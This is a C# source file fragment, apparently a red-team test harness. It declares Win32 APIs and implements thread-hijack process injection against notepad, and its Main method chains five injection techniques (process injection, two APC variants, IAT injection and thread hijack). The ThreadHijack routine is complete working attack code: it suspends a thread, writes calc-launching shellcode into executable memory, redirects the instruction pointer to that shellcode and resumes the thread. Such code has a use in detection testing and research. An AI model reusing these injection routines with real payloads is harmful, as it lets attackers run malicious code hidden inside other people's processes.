	public const int PROCESS_VM_READ = 0x0010;
	public const int PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

	// Memory permissions
	public const uint MEM_COMMIT = 0x00001000;
	public const uint MEM_RESERVE = 0x00002000;
	public const uint PAGE_READWRITE = 0x04;
	public const uint PAGE_EXECUTE_READWRITE = 0x40;


	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll")]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

}

public class ThreadHijack
{
    // Import API Functions
	[DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

	[DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

	[DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

	[DllImport("kernel32", CharSet = CharSet.Auto,SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);


    // Process privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // Memory permissions
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
	const uint PAGE_EXECUTE_READWRITE = 0x40;

	[Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
	  THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	  THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	public enum CONTEXT_FLAGS : uint
	{
	   CONTEXT_i386 = 0x10000,
	   CONTEXT_i486 = 0x10000,   //  same as i386
	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
	}

	// x86 float save
	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		 public uint ControlWord;
		 public uint StatusWord;
		 public uint TagWord;
		 public uint ErrorOffset;
		 public uint ErrorSelector;
		 public uint DataOffset;
		 public uint DataSelector;
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		 public byte[] RegisterArea;
		 public uint Cr0NpxState;
	}

	// x86 context structure (not used in this example)
	[StructLayout(LayoutKind.Sequential)]
	public struct CONTEXT
	{
		 public uint ContextFlags; //set this to an appropriate value
		 // Retrieved by CONTEXT_DEBUG_REGISTERS
		 public uint Dr0;
		 public uint Dr1;
		 public uint Dr2;
		 public uint Dr3;
		 public uint Dr6;
		 public uint Dr7;
		 // Retrieved by CONTEXT_FLOATING_POINT
		 public FLOATING_SAVE_AREA FloatSave;
		 // Retrieved by CONTEXT_SEGMENTS
		 public uint SegGs;
		 public uint SegFs;
		 public uint SegEs;
		 public uint SegDs;
		 // Retrieved by CONTEXT_INTEGER
		 public uint Edi;
		 public uint Esi;
		 public uint Ebx;
		 public uint Edx;
		 public uint Ecx;
		 public uint Eax;
		 // Retrieved by CONTEXT_CONTROL
		 public uint Ebp;
		 public uint Eip;
		 public uint SegCs;
		 public uint EFlags;
		 public uint Esp;
		 public uint SegSs;
		 // Retrieved by CONTEXT_EXTENDED_REGISTERS
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		 public byte[] ExtendedRegisters;
	}

	// x64 m128a
	[StructLayout(LayoutKind.Sequential)]
	public struct M128A
	{
		 public ulong High;
		 public long Low;

		 public override string ToString()
		 {
		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
		 }
	}

	// x64 save format
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct XSAVE_FORMAT64
	{
		public ushort ControlWord;
		public ushort StatusWord;
		public byte TagWord;
		public byte Reserved1;
		public ushort ErrorOpcode;
		public uint ErrorOffset;
		public ushort ErrorSelector;
		public ushort Reserved2;
		public uint DataOffset;
		public ushort DataSelector;
		public ushort Reserved3;
		public uint MxCsr;
		public uint MxCsr_Mask;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public M128A[] FloatRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public M128A[] XmmRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		public byte[] Reserved4;
	}

	// x64 context structure
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct CONTEXT64
	{
		public ulong P1Home;
		public ulong P2Home;
		public ulong P3Home;
		public ulong P4Home;
		public ulong P5Home;
		public ulong P6Home;

		public CONTEXT_FLAGS ContextFlags;
		public uint MxCsr;

		public ushort SegCs;
		public ushort SegDs;
		public ushort SegEs;
		public ushort SegFs;
		public ushort SegGs;
		public ushort SegSs;
		public uint EFlags;

		public ulong Dr0;
		public ulong Dr1;
		public ulong Dr2;
		public ulong Dr3;
		public ulong Dr6;
		public ulong Dr7;

		public ulong Rax;
		public ulong Rcx;
		public ulong Rdx;
		public ulong Rbx;
		public ulong Rsp;
		public ulong Rbp;
		public ulong Rsi;
		public ulong Rdi;
		public ulong R8;
		public ulong R9;
		public ulong R10;
		public ulong R11;
		public ulong R12;
		public ulong R13;
		public ulong R14;
		public ulong R15;
		public ulong Rip;

		public XSAVE_FORMAT64 DUMMYUNIONNAME;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
		public M128A[] VectorRegister;
		public ulong VectorControl;

		public ulong DebugControl;
		public ulong LastBranchToRip;
		public ulong LastBranchFromRip;
		public ulong LastExceptionToRip;
		public ulong LastExceptionFromRip;
		}

    public static int Inject()
    {
		// Get target process by name

		Process targetProcess = Process.GetProcessesByName("notepad")[0];


		// Open and Suspend first thread
		ProcessThread pT = targetProcess.Threads[0];

		IntPtr pOpenThread = OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)pT.Id);
		SuspendThread(pOpenThread);

		// Get thread context
		CONTEXT64 tContext = new CONTEXT64();
		tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
		if (GetThreadContext(pOpenThread, ref tContext))
		{

		}

		// WinExec shellcode from: https://github.com/peterferrie/win-exec-calc-shellcode
		// Compiled with:
		// nasm w64-exec-calc-shellcode.asm -DSTACK_ALIGN=TRUE -DFUNC=TRUE -DCLEAN=TRUE -o w64-exec-calc-shellcode.bin
		byte[] payload = new byte[112] {
		0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3
		};

		// Once shellcode has executed return to thread original EIP address (mov to rax then jmp to address)
		byte[] mov_rax = new byte[2] {
			0x48, 0xb8
		};
		byte[] jmp_address = BitConverter.GetBytes(tContext.Rip);
		byte[] jmp_rax = new byte[2] {
			0xff, 0xe0
		};

		// Build shellcode
		byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
		payload.CopyTo(shellcode, 0);
		mov_rax.CopyTo(shellcode, payload.Length);
		jmp_address.CopyTo(shellcode, payload.Length+mov_rax.Length);
		jmp_rax.CopyTo(shellcode, payload.Length+mov_rax.Length+jmp_address.Length);

		// OpenProcess to allocate memory
		IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

		// Allocate memory for shellcode within process
		IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		// Write shellcode within process
		UIntPtr bytesWritten;
        bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

		// Read memory to view shellcode
		int bytesRead = 0;
        byte[] buffer = new byte[shellcode.Length];
		ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);

		// Set context EIP to location of shellcode
		tContext.Rip=(ulong)allocMemAddress.ToInt64();

		// Apply new context to suspended thread
		if(!SetThreadContext(pOpenThread, ref tContext))
		{

		}
		if (GetThreadContext(pOpenThread, ref tContext))
		{

		}
		// Resume the thread, redirecting execution to shellcode, then back to original process

		ResumeThread(pOpenThread);

        return 0;
    }
}

public class Program
{
	public static void Main()
	{
		//Test One:
		Console.WriteLine("{0}", "#1 ProcessInject");
		ProcessInject.Inject();
		Console.WriteLine("{0}", "ProcessInject Complete");
		//Test Two:
		Console.WriteLine("{0}", "#2 ApcInjectionAnyProcess");
		ApcInjectionAnyProcess.Inject();
		Console.WriteLine("{0}", "ApcInjectionAnyProcess Complete");
		//Test Three:
		Console.WriteLine("{0}", "#3 ApcInjectionNewProcess");
		ApcInjectionNewProcess.Inject();
		Console.WriteLine("{0}", "ApcInjectionNewProcess Complete");
		//Test Four:
		Console.WriteLine("{0}", "#4 IatInjection");
		IatInjection.Inject();
		Console.WriteLine("{0}", "IatInjection Complete");
		//Test Five:
		Console.WriteLine("{0}", "#5 ThreadHijack");
		ThreadHijack.Inject();
		Console.WriteLine("{0}", "ThreadHijack Complete ");

	}

}
